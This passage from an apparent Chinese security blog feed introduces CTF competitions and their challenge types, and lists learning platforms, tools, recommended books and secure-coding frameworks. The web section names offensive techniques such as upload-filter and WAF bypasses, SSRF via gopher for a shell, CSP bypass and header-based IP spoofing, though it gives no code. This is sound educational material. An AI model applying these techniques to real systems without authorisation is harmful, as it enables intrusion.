xss、CSP绕过</li><li>十四、XXE，各种XML存在地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）</li><li>十五、协议，花式IP伪造 X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA，花式藏FLAG、花式分析数据包</li><li>以上参考自：<a href="https://weibo.com/ttarticle/p/show?id=2309403980950244591011" target="_blank" rel="noopener">https://weibo.com/ttarticle/p/show?id=2309403980950244591011</a></li></ul></blockquote><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><ul><li>攻击远程服务器的服务</li><li>会提供服务程序的二进制文件</li><li>分析漏洞并写出exp</li><li>栈溢出、堆溢出</li><li>绕过保护机制（ASLR,NX等）<br>给出一个有漏洞的程序，参赛者通过二进制漏洞挖掘与利用，如静态分析和动态分析来攻破该运行程序。如利用Buffer Overflow、Format String、命令执行等。使用的工具有：pwntools,IDA,GDB.....</li></ul><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>主要考察选手对于源代码及二进制逆向分析能力，要求熟悉操作系统、汇编语言、加解密等知识</p><ul><li>逆向，破解程序的算法来得到程序中的flag</li><li>对抗反调试、代码混淆等等<br>使用的工具有：IDA,onlydbg,GDB,Dex2jar.....</li></ul><h3 id="移动安全"><a href="#移动安全" class="headerlink" title="移动安全"></a>移动安全</h3><p>移动应用安全</p><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><ul><li>Stego（隐写）</li></ul><p>1.图片隐写<br>文件拼接，文件修复，LSB,EXIF,图片处理，图片内容等等。<br>2.音频隐写<br>隐藏在声音里（顺序、逆序）、隐藏在数据里、隐藏在声波和频谱里，常用的工具有：Audacity,Matlab.silienteye。<br>3,视频隐写<br>主要是在metadata，或者在帧里面，帧转化成图片隐写<br>主要工具：strings/010Editor、ffmpeg</p><ul><li>CRYPTO（解密）<br>常见编码、代码混淆与加密、古典密码、单向散列、现代密码、自定义加密、特殊密码</li><li>PPC（编程）<br>考察快速编程能力。</li><li>Forensics（取证）<br>1、网络流量分析，从数据流中取字符串，从数据流中取文件，从协议相关数据提取。<br>2、日志分析，SQL注入日志分析，结合web进行漏洞分析、WEBSHELL的查找、用户访问敏感路径的查找。<br>3、Office取证<br>藏在解压文件中、藏在doc十六进制中、文件爆破</li><li>Other（其他）<br>文件修复、密码爆破、伪加密位、明文攻击、CRC32碰撞</li></ul><h2 id="CTF学习"><a href="#CTF学习" class="headerlink" title="CTF学习"></a>CTF学习</h2><p>CTF学习需要掌握计算机基础、web应用、数据库等知识，详细请参考[CTF学习]（<a href="https://hksanduo.github.io/security/2018/07/19/awesome-ctf-learning-lists/）">https://hksanduo.github.io/security/2018/07/19/awesome-ctf-learning-lists/）</a></p><hr><p>附：有什么问题请及时联系本人，本人CTF新人，多谢关照。</p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF基础介绍</title>
    <link href="/2019/01/20/2019-01-20-ctf-about/"/>
    <url>/2019/01/20/2019-01-20-ctf-about/</url>
    
    <content type="html"><![CDATA[<h1 id="CTF-基础"><a href="#CTF-基础" class="headerlink" title="CTF 基础"></a>CTF 基础</h1><hr><p>CTF(Capture The Flag，夺旗赛），在网络安全领域中指安全人员之间进行技术竞技的一种比赛。</p><h2 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h2><p>CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯” 。</p><h2 id="CTF赛事"><a href="#CTF赛事" class="headerlink" title="CTF赛事"></a>CTF赛事</h2><blockquote><ul><li>ISCC(信息安全与对抗技术竞赛)</li><li>ISG（中国网络安全技能竞赛）</li><li>XCTF（XCTF国际网络攻防联赛）</li><li>…</li></ul></blockquote><h2 id="CTF竞赛模式"><a href="#CTF竞赛模式" class="headerlink" title="CTF竞赛模式"></a>CTF竞赛模式</h2><blockquote><ul><li>解题模式</li><li>攻防模式</li><li>防御模式</li><li>混合模式</li><li>综合模式</li></ul></blockquote><h3 id="解题模式"><a href="#解题模式" class="headerlink" title="解题模式"></a>解题模式</h3><p>常见于线上选拨比赛，参赛队伍需要运用安全相关的理论知识及技术来解决问题，并获取一串被称为flag的字符串进行提交，以此来获取分数<br>特点：每一道题目都有相应的分值，同一类题目中难度越大分值越高。</p><h3 id="综合模式"><a href="#综合模式" class="headerlink" title="综合模式"></a>综合模式</h3><p>综合靶场贴合行业用户业务系统架构，整个综合靶场由多台漏洞靶机构成。用户可以有多个攻防入口多种攻防路径选择，让参赛选手在大型真实的行业业务系统中进行挑战，难度较高。</p><h3 id="攻防模式"><a href="#攻防模式" class="headerlink" title="攻防模式"></a>攻防模式</h3><p>每个参赛队伍既是攻击者又是防御者，保证自己的服务器不被攻击、服务不中断。通过漏洞挖掘、流量分析等方式找到可利用的漏洞，攻击其他队伍的服务器。</p><h3 id="防御模式"><a href="#防御模式" class="headerlink" title="防御模式"></a>防御模式</h3><p>每个参赛队伍均是防御者，保证自己的服务器不被攻击、服务不中断。</p><h3 id="混合模式"><a href="#混合模式" class="headerlink" title="混合模式"></a>混合模式</h3><p>结合解题模式与攻防模式的CTF赛制，如通过解题模式获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏。</p><h2 id="现状"><a href="#现状" class="headerlink" title="现状"></a>现状</h2><p>由于国内重视网络安全法，从18年开始出现爆发时增长态势，各种层次不齐的CTF赛事层出不穷。</p><h3 id="比赛形式"><a href="#比赛形式" class="headerlink" title="比赛形式"></a>比赛形式</h3><blockquote><ul><li>线上预选赛</li><li>线下半决赛</li><li>线下总决赛</li></ul></blockquote><h3 id="价值体现"><a href="#价值体现" class="headerlink" title="价值体现"></a>价值体现</h3><p>行业选拔人才，提升重要行业部门，科研院校的网络安全实战能力；行业提高安全部门的入侵检测和防御能力，增加公司荣誉；个人提高就业机会和增加零花钱。</p><h2 id="CTF-题型"><a href="#CTF-题型" class="headerlink" title="CTF 题型"></a>CTF 题型</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>SQL,XSS,文件上传，ssrf，远程命令执行等等</p><blockquote><ul><li>一、爆破，包括包括md5、爆破随机数、验证码识别等</li><li>二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截</li><li>三、花式玩弄几个PHP特性，包括弱类型，strpos和===，反序列化+destruct、\0截断、iconv截断、</li><li>四、密码题，包括hash长度扩展、异或、移位加密各种变形、32位随机数过小</li><li>五、各种找源码技巧，包括git、svn、xxx.php.swp、<em>www</em>.(zip|tar.gz|rar|7z)、xxx.php.bak</li><li>六、文件上传，包括花式文件后缀 .php345 .inc .phtml .phpt .phps、各种文件内容检测&lt;?php &lt;? &lt;% <script language=php>、花式解析漏洞、</li><li>七、Mysql类型差异，包括和PHP弱类型类似的特性,0x、0b、1e之类，varchar和integer相互转换</li><li>八、open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、DirectoryIterator及各种二进制选手插足的方法</li><li>九、条件竞争，包括竞争删除前生成shell、竞争数据库无锁多扣钱</li><li>十、社工，包括花式查社工库、微博、QQ签名、whois</li><li>十一、windows特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、::$DATA，冒号截断</li><li>十二、SSRF，包括花式探测端口，302跳转、花式协议利用、gophar直接取shell等</li><li>十三、XSS，各种浏览器auditor绕过、富文本过滤黑白名单绕过、flash xss、CSP绕过</li><li>十四、XXE，各种XML存在地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）</li><li>十五、协议，花式IP伪造 X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA，花式藏FLAG、花式分析数据包</li><li>以上参考自：<a href="https://weibo.com/ttarticle/p/show?id=2309403980950244591011" target="_blank" rel="noopener">https://weibo.com/ttarticle/p/show?id=2309403980950244591011</a></li></ul></blockquote><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><ul><li>攻击远程服务器的服务</li><li>会提供服务程序的二进制文件</li><li>分析漏洞并写出exp</li><li>栈溢出、堆溢出</li><li>绕过保护机制（ASLR,NX等）<br>给出一个有漏洞的程序，参赛者通过二进制漏洞挖掘与利用，如静态分析和动态分析来攻破该运行程序。如利用Buffer Overflow、Format String、命令执行等。使用的工具有：pwntools,IDA,GDB.....</li></ul><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>主要考察选手对于源代码及二进制逆向分析能力，要求熟悉操作系统、汇编语言、加解密等知识</p><ul><li>逆向，破解程序的算法来得到程序中的flag</li><li>对抗反调试、代码混淆等等<br>使用的工具有：IDA,onlydbg,GDB,Dex2jar.....</li></ul><h3 id="移动安全"><a href="#移动安全" class="headerlink" title="移动安全"></a>移动安全</h3><p>移动应用安全</p><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><ul><li>Stego（隐写）</li></ul><p>1.图片隐写<br>文件拼接，文件修复，LSB,EXIF,图片处理，图片内容等等。<br>2.音频隐写<br>隐藏在声音里（顺序、逆序）、隐藏在数据里、隐藏在声波和频谱里，常用的工具有：Audacity,Matlab.silienteye。<br>3,视频隐写<br>主要是在metadata，或者在帧里面，帧转化成图片隐写<br>主要工具：strings/010Editor、ffmpeg</p><ul><li>CRYPTO（解密）<br>常见编码、代码混淆与加密、古典密码、单向散列、现代密码、自定义加密、特殊密码</li><li>PPC（编程）<br>考察快速编程能力。</li><li>Forensics（取证）<br>1、网络流量分析，从数据流中取字符串，从数据流中取文件，从协议相关数据提取。<br>2、日志分析，SQL注入日志分析，结合web进行漏洞分析、WEBSHELL的查找、用户访问敏感路径的查找。<br>3、Office取证<br>藏在解压文件中、藏在doc十六进制中、文件爆破</li><li>Other（其他）<br>文件修复、密码爆破、伪加密位、明文攻击、CRC32碰撞</li></ul><h2 id="CTF学习"><a href="#CTF学习" class="headerlink" title="CTF学习"></a>CTF学习</h2><p>CTF学习需要掌握计算机基础、web应用、数据库等知识，详细请参考[CTF学习]（<a href="https://hksanduo.github.io/security/2018/07/19/awesome-ctf-learning-lists/）">https://hksanduo.github.io/security/2018/07/19/awesome-ctf-learning-lists/）</a></p><hr><p>附：有什么问题请及时联系本人，本人CTF新人，多谢关照。</p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF学习</title>
    <link href="/2018/07/19/2018-07-19-awesome-ctf-learning-lists/"/>
    <url>/2018/07/19/2018-07-19-awesome-ctf-learning-lists/</url>
    
    <content type="html"><![CDATA[<h2 id="CTF学习"><a href="#CTF学习" class="headerlink" title="CTF学习"></a>CTF学习</h2><p>CTF（Capture The Flag，夺旗赛）起源于 1996 年 DEFCON 全球黑客大会，是网络安全爱好者之间的竞技游戏。</p><p>CTF 竞赛涉及众多领域，内容繁杂。目前，安全技术发展地越来越快，CTF 题目的难度越来越高,这里我会总结一些常用的工具、靶场及站点，供大家参考。</p><h1 id="学习路线"><a href="#学习路线" class="headerlink" title="学习路线"></a>学习路线</h1><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/" target="_blank" rel="noopener">CTF Wiki</a></li><li><a href="https://github.com/Hack-with-Github/Awesome-Hacking" target="_blank" rel="noopener">Awesome Hacking</a></li><li><a href="https://github.com/enaqx/awesome-pentest" target="_blank" rel="noopener">Awesome Pentest</a></li><li><a href="https://github.com/apsdehal/awesome-ctf" target="_blank" rel="noopener">Awesome CTF</a></li><li><a href="https://github.com/p4-team/ctf" target="_blank" rel="noopener">Ctf solutions from p4 team</a></li><li><a href="http://blog.knownsec.com/Knownsec_RD_Checklist/index.html" target="_blank" rel="noopener">知道创宇研发技能表 v3.1</a></li><li><a href="https://skills.bugbank.cn/" target="_blank" rel="noopener">漏洞银行(BUGBANK)技能树</a></li><li><a href="https://evilcos.me/security_skill_tree_basic/index.html" target="_blank" rel="noopener">安全技能树简版 by 余弦</a></li><li><a href="https://github.com/phith0n/Mind-Map" target="_blank" rel="noopener">安全类思维导图 by phith0n</a></li></ul><h1 id="CTF平台"><a href="#CTF平台" class="headerlink" title="CTF平台"></a>CTF平台</h1><ul><li><a href="http://ctf.bugku.com/" target="_blank" rel="noopener">BugKu CTF</a></li><li><a href="https://github.com/ctfs" target="_blank" rel="noopener">github Ctfs</a></li><li><a href="http://www.wechall.net/" target="_blank" rel="noopener">Wechall</a></li><li><a href="https://exploit-exercises.com/protostar/" target="_blank" rel="noopener">Protostar</a></li><li><a href="https://exploit-exercises.com/protostar/" target="_blank" rel="noopener">XCTF</a></li><li><a href="https://www.ichunqiu.com/competition" target="_blank" rel="noopener">IChunQiu CTF</a></li><li><a href="https://pwnhub.cn/index" target="_blank" rel="noopener">Pwnhub</a></li><li><a href="http://ctf.nuptsast.com/" target="_blank" rel="noopener">南京邮电大学网络攻防平台</a></li><li><a href="http://hackinglab.cn/" target="_blank" rel="noopener">HackingLab 网络信息安全攻防学习平台</a></li><li><a href="https://www.jarvisoj.com/" target="_blank" rel="noopener">Jarvis</a></li><li><a href="https://ctflearn.com/" target="_blank" rel="noopener">Ctf Learn</a></li></ul><h1 id="CTF在线工具"><a href="#CTF在线工具" class="headerlink" title="CTF在线工具"></a>CTF在线工具</h1><ul><li><a href="https://www.ctftools.com/down/" target="_blank" rel="noopener">CTF Tools</a></li><li><a href="http://ctf.ssleye.com/" target="_blank" rel="noopener">CTF 编码</a></li><li><a href="http://tool.bugku.com/" target="_blank" rel="noopener">BugKu 在线工具箱</a></li><li><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">ctf-tools github</a></li></ul><h1 id="CTF离线工具"><a href="#CTF离线工具" class="headerlink" title="CTF离线工具"></a>CTF离线工具</h1><ul><li><a href="https://tools.pediy.com/" target="_blank" rel="noopener">看雪工具</a></li></ul><h1 id="安全靶场"><a href="#安全靶场" class="headerlink" title="安全靶场"></a>安全靶场</h1><ul><li><a href="https://www.vulnhub.com/" target="_blank" rel="noopener">vulnhub</a></li></ul><h1 id="离线学习平台"><a href="#离线学习平台" class="headerlink" title="离线学习平台"></a>离线学习平台</h1><ul><li><a href="https://vulhub.org/" target="_blank" rel="noopener">vulnhub docker</a></li><li><a href="http://vulapps.evalbug.com/" target="_blank" rel="noopener">vulapps</a></li><li><a href="https://hub.docker.com/r/kalilinux/kali-linux-docker/" target="_blank" rel="noopener">official Kali Linux</a></li><li><a href="https://github.com/zaproxy/zaproxy" target="_blank" rel="noopener">official OWASP ZAP</a></li><li><a href="https://hub.docker.com/r/wpscanteam/wpscan/" target="_blank" rel="noopener">official WPScan</a></li><li><a href="https://hub.docker.com/r/citizenstig/dvwa/" target="_blank" rel="noopener">Damn Vulnerable Web Application (DVWA)</a></li><li><a href="https://hub.docker.com/r/wpscanteam/vulnerablewordpress/" target="_blank" rel="noopener">Vulnerable WordPress Installation</a></li><li><a href="https://hub.docker.com/r/opendns/security-ninjas/" target="_blank" rel="noopener">Security Ninjas</a></li><li><a href="https://hub.docker.com/r/diogomonica/docker-bench-security/" target="_blank" rel="noopener">Docker Bench for Security</a></li><li><a href="https://hub.docker.com/r/ismisepaul/securityshepherd/" target="_blank" rel="noopener">OWASP Security Shepherd</a></li><li><a href="https://hub.docker.com/r/danmx/docker-owasp-webgoat/" target="_blank" rel="noopener">OWASP WebGoat Project docker image</a></li><li><a href="https://hub.docker.com/r/citizenstig/nowasp/" target="_blank" rel="noopener">OWASP Mutillidae II Web Pen-Test Practice Application</a></li></ul><p>离线平台docker资源链接参考<a href="https://github.com/infoslack/awesome-web-hacking" target="_blank" rel="noopener">awesome-web-hacking</a></p><hr><p>附：有什么问题请及时联系本人，本人CTF新人，多谢关照。</p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安全从业者书单推荐</title>
    <link href="/2018/07/19/2018-07-19-Security-worker-books-lists/"/>
    <url>/2018/07/19/2018-07-19-Security-worker-books-lists/</url>
    
    <content type="html"><![CDATA[<h1 id="信息安全新人阅读书籍"><a href="#信息安全新人阅读书籍" class="headerlink" title="信息安全新人阅读书籍"></a>信息安全新人阅读书籍</h1><hr><p>我们在学习信安的途中会阅读很多书籍，其中书籍的质量层次不齐，前几天看泉哥（riusksk）的博客，看到他写了一个信息安全从业者书单推荐，下面是github链接<a href="">https://github.com/riusksk/secbook</a></p><p><img src="/images/Security-worker-books-lists-by-riusksk.jpg" srcset="/img/loading.gif" alt=""></p><p>以下书籍列表是基于泉哥推荐书籍列表汇总的，不定期进行更新</p><h1 id="计算机及系统原理"><a href="#计算机及系统原理" class="headerlink" title="计算机及系统原理"></a>计算机及系统原理</h1><p>· 《编码：隐匿在计算机软硬件背后的语言》 【美】Charles Petzold</p><p>· 《深入理解计算机系统》【美】Randal E.Bryant</p><p>· 《深入理解Windows操作系统》【美】Russinovich,M.E.；Solomon,D.A.</p><p>· 《Linux内核设计与实现》【美】Robert Love</p><p>· 《深入理解Android内核设计思想》林学森</p><p>· 《Android系统源代码情景分析》罗升阳</p><p>· 《深入理解Mac OS X &amp; iOS操作系统》【美】Jonathan Levin</p><p>· 《深入理解Linux内核》 【美】DanielP.Bovet</p><p>· 《代码揭秘：从C/C++的角度探秘计算机系统》左飞</p><p>· 《Android Dalvik虚拟机结构及机制剖析（第1、2卷）》吴艳霞；张国印</p><p>· 《Android Internals::Power User’s View》【美】Jonathan Levin，中文书名《最强Android书：架构大剖析》已上架</p><h1 id="编程开发"><a href="#编程开发" class="headerlink" title="编程开发"></a>编程开发</h1><h2 id="系统平台"><a href="#系统平台" class="headerlink" title="系统平台"></a>系统平台</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>· 《Windows程序设计》【美】Charles Petzold</p><p>· 《Windows核心编程》【美】Jeffrey Richter</p><p>· 《Windows环境下32位汇编语言程序设计》罗云彬</p><p>· 《Windows驱动开发技术详解》张帆</p><h3 id="Linux-Unix"><a href="#Linux-Unix" class="headerlink" title="Linux/Unix"></a>Linux/Unix</h3><p>· 《UNIX环境高级编程》【美】W.Richard Stevens；Stephen A.Rago</p><p>· 《Linux程序设计》【美】Neil Matthew；Richard Stones</p><p>· 《鸟哥的Linux私房菜》鸟哥</p><p>· 《Linux设备驱动程序》【美】Jonathan Corbet；Alessandro Rubini；Gerg Kroah-Hartman</p><h3 id="MAC-OS-iOS"><a href="#MAC-OS-iOS" class="headerlink" title="MAC OS/iOS"></a>MAC OS/iOS</h3><p>· 《iOS编程》【美】Christian Keur；Aaron Hillegass</p><p>· 《OS X与iOS内核编程）【澳】Halvorsen,O.H.；Clarke,D</p><h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><p>· 《第一行代码——Android》郭霖</p><p>· 《Android编程权威指南》【美】Brian Hardy；BillPhillips</p><h2 id="编程语言"><a href="#编程语言" class="headerlink" title="编程语言"></a>编程语言</h2><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><p>· 《C语言程序设计》【美】Brian W.Kernighan；Dennis M.Ritchie</p><p>· 《C Primer Plus》【美】Stephen Prata，入门书籍</p><p>· 《C和指针》【美】Kenneth A.Reek</p><p>· 《C陷阱与缺陷》【美】Andrew Koenig</p><p>· 《C专家编程》【美】Peter van der Linden</p><h3 id="C-1"><a href="#C-1" class="headerlink" title="C++"></a>C++</h3><p>· 《C++ Primer Plus》【美】Stephen Prata，入门书籍</p><p>· 《C++ Primer》【美】Stanley B.Lippman；Josée Lajoie；Barbara E.Moo，进阶书籍</p><h3 id="ASM"><a href="#ASM" class="headerlink" title="ASM"></a>ASM</h3><p>· 《Intel汇编语言程序设计》【美】Kip Irvine</p><p>· 《Intel开发手册》</p><p>· 《汇编语言（第3版）》王爽</p><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>· 《Java核心技术》【美】Cay S.Horstmann；Gary Cornell，入门书籍</p><p>· 《Java 编程思想》【美】Bruce eckel，进阶书籍</p><h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><p>· 《JavaScript DOM编程艺术》【美】Jeremy Keith；【加】Jeffrey Sambells</p><p>· 《JavaScript高级程序设计》【美】Zakas.Bicholas C.</p><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>· 《Python核心编程（第2版）》【美】Wesley J·Chun</p><h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p>· 《Linux Shell脚本攻略》【印】Sarath Lakshman</p><h2 id="调试技术"><a href="#调试技术" class="headerlink" title="调试技术"></a>调试技术</h2><p>· 《软件调试》张银奎</p><p>· 《Debug Hacks》【日】吉冈弘隆；大和一洋；大岩尚宏；安部东洋；吉田俊辅</p><p>· 《格蠹汇编：软件调试案例锦集》张银奎</p><h2 id="数据结构与算法"><a href="#数据结构与算法" class="headerlink" title="数据结构与算法"></a>数据结构与算法</h2><p>· 《数据结构与算法分析——C语言描述》【美】Mark Allen Weiss</p><p>· 《算法导论》【美】Thomas H.Cormen；Chales E.Leiserson；Ronald l.Rivest</p><h2 id="编译原理"><a href="#编译原理" class="headerlink" title="编译原理"></a>编译原理</h2><p>· 《编译系统透视：图解编译原理》新设计团队，入门书籍</p><p>· 《编译原理》（龙书）【美】Alfered V.Aho；Monica S.Lam；Ravi Sehi；Jeffrey D.Ullmam</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>· 《编程高手箴言》梁肇新</p><p>· 《代码整洁之道》【美】Robert C.Martin</p><p>· 《代码大全》【美】Steve McConnell</p><h1 id="网络技术"><a href="#网络技术" class="headerlink" title="网络技术"></a>网络技术</h1><p>· 《TCP/IP详解（卷1：协议）》【美】Kevin R.fall；W.Richard Stevens</p><p>· 《Wireshark数据包分析实战》【美】Chris Sanders</p><h1 id="安全技术"><a href="#安全技术" class="headerlink" title="安全技术"></a>安全技术</h1><h2 id="安全开发"><a href="#安全开发" class="headerlink" title="安全开发"></a>安全开发</h2><p>· 《天书夜读：从汇编语言到Windows内核编程》谭文；邵坚磊</p><p>· 《Rootkit：系统灰色地带的潜伏者》【美】Bill Blunden</p><p>· 《Rootkits——Windows内核的安全防护》【美】Gerg Hoglund；James Butler</p><p>· 《BSD ROOTKIT设计——内核黑客指引书》【美】Joseph Kong</p><p>· 《寒江独钓：Windows内核安全编程》谭文；杨潇；邵坚磊</p><h2 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h2><p>· 《恶意软件分析诀窍与工具箱——对抗“流氓”软件的技术与利器》【美】Michael Hale Ligh；Steven Adair</p><p>· 《C++反汇编与逆向分析技术揭秘》钱林松；赵海旭</p><p>· 《IDA权威指南》【美】Chris Eagle</p><p>· 《逆向工程权威指南》【乌克兰】Dennis Yurichev，多平台入门大全</p><p>· 《Android软件安全与逆向分析》丰生强</p><p>· 《macOS软件安全与逆向分析》丰生强</p><p>· 《iOS应用逆向工程（第2版）》沙梓社；吴航</p><h2 id="Web安全"><a href="#Web安全" class="headerlink" title="Web安全"></a>Web安全</h2><p>· 《黑客攻防技术宝典：Web实战篇》【美】Marcus Pinto，Dafydd Stuttard</p><p>· 《白帽子讲Web安全》吴翰清</p><p>· 《Web安全测试》【美】Paco Hope；Ben Waltber</p><p>· 《Web前端黑客技术揭秘》钟晨鸣；徐少培</p><p>· 《精通脚本黑客》曾云好</p><h2 id="软件-系统安全"><a href="#软件-系统安全" class="headerlink" title="软件/系统安全"></a>软件/系统安全</h2><p>· 《0day安全：软件漏洞分析技术（第2版）》王清，入门书籍</p><p>· 《漏洞战争：软件漏洞分析精要》林桠泉，进阶书籍</p><p>· 《捉虫日记》【德】Tobias Klein，进阶书籍</p><p>· 《黑客防线2009缓冲区溢出攻击与防范专辑》</p><p>· 《内核漏洞的利用与防范》【美】Enrico Perla；Massimiliano Oldani</p><p>· 《Fuzzing for Software Security Testing and Quality Assurance（第2版）》【美】Charlie Miller，博文视点翻译中</p><p>· 《iOS Hackers’s Handbook》【美】Charlie Miller，不推荐中文版</p><p>· 《The Mac Hacker’s Handbook》【美】Charlie Miller</p><p>· 《Android安全攻防权威指南》【美】Joshua J.Drake；【西】Pau Oliva Fora；【美】Collin Mulliner</p><p>· 《The Art of Softwar Security Assessment:Identifying and Preventing Software Vulnerabilities》【美】Mark Dowd</p><p>· 《Android安全攻防实战》【美】Keith Makan；Scott Alexander-Bow</p><p>· 《模糊测试-强制性安全漏洞挖掘》【美】Michael Mutton</p><p>· 《Exploit编写系列教程》【美】Corelan Team</p><p>· 《MacOS and iOS Internals,Volume Ⅲ: Security &amp; Insecurity》【美】Jonathan Levin，博文视点翻译中，预计今年上市</p><p>· 《灰帽黑客：正义黑客的道德规范、渗透测试、攻击方法和漏洞分析技术》【美】Allen Harper；Shon harris</p><p>· 《威胁建模：设计和交付更安全的软件》【美】Adam Shostack</p><h2 id="无线电安全"><a href="#无线电安全" class="headerlink" title="无线电安全"></a>无线电安全</h2><p>· 《无线电安全攻防大揭秘》杨卿；黄琳</p><h2 id="硬件安全"><a href="#硬件安全" class="headerlink" title="硬件安全"></a>硬件安全</h2><p>· 《硬件安全攻防大揭秘》简云定，杨卿</p><h2 id="汽车安全"><a href="#汽车安全" class="headerlink" title="汽车安全"></a>汽车安全</h2><p>· 《智能汽车安全攻防大揭秘》李均；杨卿</p><p>· 《汽车黑客大曝光》【美】Craig Smith</p><h1 id="软技能"><a href="#软技能" class="headerlink" title="软技能"></a>软技能</h1><p>· 《软技能：代码之外的生存指南》【美】John Sonmez</p><p>· 《程序员健康指南》【美】JoeKutner</p><p>· 《影响力》【美】Robert B.Cialdini</p><p>· 《穷爸爸富爸爸》【美】Robert Toru Kiyosaki</p><p>· 《写给大家看的设计书》【美】Robin Williams</p><p>· 《听故事，学PPT设计》杨雪</p><p>· 《横向领导力》【美】Roger Fisher；Alan Sharpe</p><p>· 《职业情商》张新越</p><p>· 《程序员的成长课》安晓辉；周鹏</p><p>· 《高效演讲：斯坦福最受欢迎的沟通课》【美】Peter Meyers；Shann Nix</p><p>· 《程序员的英语》【韩】朴栽浒；李海永</p><p>· 《思考，快与慢》【美】丹尼尔·卡尼曼</p><p>· 《少有人走的路》【美】斯科特·派克</p><p>· 《异类：不一样的成功启示录》【加】 马尔科姆·格拉德威尔 </p><p>· 《见识》吴军</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Books</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安全开发之安全开发框架</title>
    <link href="/2018/07/12/2018-07-12-security-development-framework/"/>
    <url>/2018/07/12/2018-07-12-security-development-framework/</url>
    
    <content type="html"><![CDATA[<p>在软件开发的过程中，系统设计和开发人员必须要面对一系列复杂的安全问题，如果在系统正式上线之前就做好安全风险防范，越早考虑到安全问题，那么需要解决问题所需要的<br>成本就越低。当应用系统部署完成以后，修复漏洞的成不很高，可能会影响到业务能力。</p><p>通过对常见的应用漏洞进行分析研究，给出规避安全漏洞的建议和要求，根本上解决应用系统的安全漏洞，通过规范安全编码，开发人员可以养成良好编程的习惯，这样可以提高<br>系统的安全性和健壮性，保障业务顺利进行。</p><h1 id="安全编码准则"><a href="#安全编码准则" class="headerlink" title="安全编码准则"></a>安全编码准则</h1><h2 id="输入的数据均有害"><a href="#输入的数据均有害" class="headerlink" title="输入的数据均有害"></a>输入的数据均有害</h2><h2 id="最小化原则"><a href="#最小化原则" class="headerlink" title="最小化原则"></a>最小化原则</h2><h2 id="不依赖运行环境的安全配置"><a href="#不依赖运行环境的安全配置" class="headerlink" title="不依赖运行环境的安全配置"></a>不依赖运行环境的安全配置</h2><h2 id="失败终止原则"><a href="#失败终止原则" class="headerlink" title="失败终止原则"></a>失败终止原则</h2><h2 id="安全控制措施落实在最后阶段"><a href="#安全控制措施落实在最后阶段" class="headerlink" title="安全控制措施落实在最后阶段"></a>安全控制措施落实在最后阶段</h2><h2 id="简单原则"><a href="#简单原则" class="headerlink" title="简单原则"></a>简单原则</h2><h1 id="常见安全开发框架"><a href="#常见安全开发框架" class="headerlink" title="常见安全开发框架"></a>常见安全开发框架</h1><h2 id="spring-security"><a href="#spring-security" class="headerlink" title="spring security"></a>spring security</h2><p>spring security相关站点：</p><ul><li><a href="https://spring.io/projects/spring-security" target="_blank" rel="noopener">spring security官网</a></li><li><a href="https://vincentmi.gitbooks.io/spring-security--reference-zh/content/1_introduction.html" target="_blank" rel="noopener">spring security中文介绍</a> </li><li><a href="http://blog.didispace.com/springbootsecurity/" target="_blank" rel="noopener">Spring Boot中使用Spring Security进行安全控制</a></li><li><a href="https://blog.csdn.net/u012702547/article/details/54319508" target="_blank" rel="noopener">在Spring Boot中使用Spring Security实现权限控制</a></li><li><a href="https://blog.csdn.net/bao19901210/article/details/52574340" target="_blank" rel="noopener">spring security四种实现方式</a></li></ul><h2 id="apache-shiro"><a href="#apache-shiro" class="headerlink" title="apache shiro"></a>apache shiro</h2><h2 id="HDIV"><a href="#HDIV" class="headerlink" title="HDIV"></a>HDIV</h2><h2 id="DevSecOps"><a href="#DevSecOps" class="headerlink" title="DevSecOps"></a>DevSecOps</h2>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
    </categories>
    
    
